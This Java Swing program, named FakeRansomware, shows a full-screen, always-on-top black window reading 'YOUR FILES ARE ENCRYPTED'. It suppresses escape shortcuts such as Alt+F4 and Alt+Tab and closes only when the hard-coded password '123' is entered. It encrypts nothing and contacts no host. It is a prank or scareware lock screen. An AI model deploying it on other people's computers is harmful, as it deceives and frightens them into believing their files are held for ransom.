import javax.swing.*;
import java.awt.*;
import java.awt.event.*;

public class FakeRansomware {
    public static void main(String[] args) {
        JFrame frame = new JFrame();
        frame.setUndecorated(true); // Remove close buttons
        frame.setExtendedState(JFrame.MAXIMIZED_BOTH); // Full screen
        frame.setAlwaysOnTop(true); // Always on top
        frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE); // Disable close button

        // Block only Alt+F4 and other system shortcuts, but NOT blocking the keyboard for typing the password
        KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(new KeyEventDispatcher() {
            @Override
            public boolean dispatchKeyEvent(KeyEvent e) {
                if (e.getID() == KeyEvent.KEY_PRESSED) {
                    if ((e.getKeyCode() == KeyEvent.VK_F4 && e.isAltDown()) || // Block Alt+F4
                        (e.getKeyCode() == KeyEvent.VK_TAB && e.isAltDown()) || // Block Alt+Tab
                        (e.getKeyCode() == KeyEvent.VK_ESCAPE) || // Block Escape
                        (e.getKeyCode() == KeyEvent.VK_WINDOWS) || // Block Windows key
                        (e.getKeyCode() == KeyEvent.VK_DELETE && e.isControlDown() && e.isShiftDown())) { // Block Ctrl+Shift+Delete
                        return true; // Do not allow shortcut
                    }
                }
                return false; // Allow normal typing
            }
        });

        JPanel panel = new JPanel();
        panel.setLayout(new GridBagLayout());
        panel.setBackground(Color.BLACK);

        JLabel label = new JLabel(": YOUR FILES ARE ENCRYPTED");
        label.setForeground(Color.RED);
        label.setFont(new Font("Arial", Font.BOLD, 30));

        JPasswordField passwordField = new JPasswordField(10);
        JButton unlockButton = new JButton("DECRYPT");

        unlockButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String enteredPassword = new String(passwordField.getPassword());
                if (enteredPassword.equals("123")) {
                    System.exit(0); // Close the program
                }
            }
        });

        GridBagConstraints gbc = new GridBagConstraints();
        gbc.gridx = 0;
        gbc.gridy = 0;
        gbc.insets = new Insets(10, 10, 10, 10);
        panel.add(label, gbc);

        gbc.gridy = 1;
        panel.add(passwordField, gbc);

        gbc.gridy = 2;
        panel.add(unlockButton, gbc);

        frame.add(panel);
        frame.setVisible(true);
    }
}
